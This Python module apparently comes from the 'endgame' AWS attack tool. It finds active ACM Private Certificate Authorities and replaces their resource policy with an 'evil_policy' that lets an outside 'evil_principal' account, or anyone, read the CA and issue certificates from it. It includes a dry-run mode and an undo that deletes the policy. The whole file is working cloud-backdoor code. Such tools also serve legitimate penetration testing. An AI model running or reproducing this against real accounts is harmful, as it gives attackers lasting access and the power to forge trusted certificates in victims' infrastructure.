import logging
import json
import boto3
import botocore
from abc import ABC
from botocore.exceptions import ClientError
from policy_sentry.util.arns import get_account_from_arn, get_resource_path_from_arn
from endgame.shared import constants
from endgame.exposure_via_resource_policies.common import ResourceType, ResourceTypes
from endgame.shared.policy_document import PolicyDocument
from endgame.shared.response_message import ResponseMessage
from endgame.shared.list_resources_response import ListResourcesResponse

logger = logging.getLogger(__name__)


# ACM PCA is really anal-retentive about what policies have to look like.
# If you don't do it exactly how they say you have to, then it returns this error:
# botocore.errorfactory.InvalidPolicyException: An error occurred (InvalidPolicyException) when calling the PutPolicy
#   operation: InvalidPolicy: The supplied policy does not match RAM managed permissions
# https://docs.aws.amazon.com/acm-pca/latest/userguide/pca-rbp.html
# So we have to do things our own way.


class AcmPrivateCertificateAuthority(ResourceType, ABC):
    def __init__(self, name: str, region: str, client: boto3.Session.client, current_account_id: str):
        self.service = "acm-pca"
        self.resource_type = "certificate-authority"
        self.region = region
        self.current_account_id = current_account_id
        self.name = name
        self.override_account_id_instead_of_principal = True
        super().__init__(name, self.resource_type, self.service, region, client, current_account_id,
                         override_resource_block=self.arn,
                         override_account_id_instead_of_principal=self.override_account_id_instead_of_principal)

    @property
    def arn(self) -> str:
        return self.name
        # return f"arn:aws:{self.service}:{self.region}:{self.current_account_id}:{self.resource_type}/{self.name}"

    def _get_rbp(self) -> PolicyDocument:
        """Get the resource based policy for this resource and store it"""
        try:
            # https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/acm-pca.html#ACMPCA.Client.get_policy
            response = self.client.get_policy(ResourceArn=self.name)
            policy = json.loads(response.get("Policy"))
        except botocore.exceptions.ClientError:
            # When there is no policy, let's return an empty policy to avoid breaking things
            policy = constants.get_empty_policy()
        policy_document = PolicyDocument(
            policy=policy,
            service=self.service,
            override_action=self.override_action,
            include_resource_block=self.include_resource_block,
            override_resource_block=self.override_resource_block,
            override_account_id_instead_of_principal=self.override_account_id_instead_of_principal,
        )
        return policy_document

    def set_rbp(self, evil_policy: dict) -> dict:
        new_policy = json.dumps(evil_policy)
        # https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/acm-pca.html#ACMPCA.Client.put_policy
        self.client.put_policy(ResourceArn=self.arn, Policy=new_policy)
        return evil_policy

    def add_myself(self, evil_principal: str, dry_run: bool = False) -> ResponseMessage:
        """Add your rogue principal to the AWS resource"""
        # Case: principal = "arn:aws:iam::999988887777:user/mwahahaha"
        if ":" in evil_principal:
            evil_principal_account = get_account_from_arn(evil_principal)
        # Case: Principal = * or Principal = 999988887777
        else:
            evil_principal_account = evil_principal
        evil_policy = {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "1",
                    "Effect": "Allow",
                    "Principal": {
                        "AWS": evil_principal_account
                    },
                    "Action": [
                        "acm-pca:DescribeCertificateAuthority",
                        "acm-pca:GetCertificate",
                        "acm-pca:GetCertificateAuthorityCertificate",
                        "acm-pca:ListPermissions",
                        "acm-pca:ListTags"
                    ],
                    "Resource": self.arn
                },
                {
                    "Sid": "1",
                    "Effect": "Allow",
                    "Principal": {
                        "AWS": evil_principal_account
                    },
                    "Action": [
                        "acm-pca:IssueCertificate"
                    ],
                    "Resource": self.arn,
                    "Condition": {
                        "StringEquals": {
                            "acm-pca:TemplateArn": "arn:aws:acm-pca:::template/EndEntityCertificate/V1"
                        }
                    }
                }
            ]
        }

        if dry_run:
            operation = "DRY_RUN_ADD_MYSELF"
            message = f"The resource policy will be added to {self.arn}"
        else:
            operation = "ADD_MYSELF"
            self.undo(evil_principal=evil_principal)
            # new_policy = self.set_rbp(evil_policy=evil_policy)
            evil_policy = self.set_rbp(evil_policy=evil_policy)
            message = f"Added resource policy to {self.arn}"
        response_message = ResponseMessage(message=message, operation=operation, evil_principal=evil_principal,
                                           victim_resource_arn=self.arn, original_policy=self.original_policy,
                                           updated_policy=evil_policy, resource_type=self.resource_type, resource_name=self.name)
        return response_message

    def undo(self, evil_principal: str, dry_run: bool = False) -> ResponseMessage:
        new_policy = constants.get_empty_policy()
        operation = "UNDO"
        if not dry_run:
            # TODO: After you delete the policy, it still shows up in resource shares. Need to delete that.
            # https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/acm-pca.html#ACMPCA.Client.delete_policy
            self.client.delete_policy(ResourceArn=self.arn)
            message = f"Deleted the resource policy for {self.arn}"
        else:
            message = f"The resource policy for {self.arn} will be deleted."
        response_message = ResponseMessage(message=message, operation=operation, evil_principal=evil_principal,
                                           victim_resource_arn=self.arn, original_policy=self.original_policy,
                                           updated_policy=new_policy, resource_type=self.resource_type, resource_name=self.name)
        return response_message


class AcmPrivateCertificateAuthorities(ResourceTypes):
    def __init__(self, client: boto3.Session.client, current_account_id: str, region: str):
        super().__init__(client, current_account_id, region)
        self.service = "acm-pca"
        self.resource_type = "certificate-authority"

    @property
    def resources_v2(self) -> list[ListResourcesResponse]:
        """Get a list of these resources"""
        resources = []

        paginator = self.client.get_paginator("list_certificate_authorities")
        page_iterator = paginator.paginate()
        for page in page_iterator:
            these_resources = page["CertificateAuthorities"]
            for resource in these_resources:
                arn = resource.get("Arn")
                status = resource.get("Status")
                ca_type = resource.get("Type")
                name = get_resource_path_from_arn(arn)
                list_resources_response = ListResourcesResponse(
                    service=self.service, account_id=self.current_account_id, arn=arn, region=self.region,
                    resource_type=self.resource_type, name=name)
                if status == "ACTIVE":
                    resources.append(list_resources_response)
        return resources
